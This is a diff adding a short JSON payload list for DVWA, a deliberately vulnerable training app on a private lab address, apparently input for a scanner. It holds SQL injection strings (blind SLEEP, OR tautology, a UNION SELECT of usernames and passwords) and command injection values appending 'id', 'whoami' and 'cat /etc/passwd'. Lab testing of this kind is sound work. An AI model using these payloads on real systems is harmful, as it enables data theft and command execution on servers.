@@ -1,0 +1,20 @@
+[
+  {
+    "url": "http://192.168.153.200/DVWA/vulnerabilities/sqli_blind/",
+    "method": "GET",
+    "param": "id",
+    "values": ["1' AND (SELECT 1 FROM (SELECT(SLEEP(3)))a)--", "1' OR '1'='1", "test"]
+  },
+  {
+    "url": "http://192.168.153.200/DVWA/vulnerabilities/exec/",
+    "method": "POST",
+    "param": "ip",
+    "values": ["127.0.0.1; id", "127.0.0.1; whoami", "127.0.0.1; cat /etc/passwd"]
+  },
+  {
+    "url": "http://192.168.153.200/DVWA/vulnerabilities/sqli/",
+    "method": "GET",
+    "param": "id",
+    "values": ["1' OR '1'='1", "1' UNION SELECT user,password FROM users--", "1' AND 1=0--"]
+  }
+]
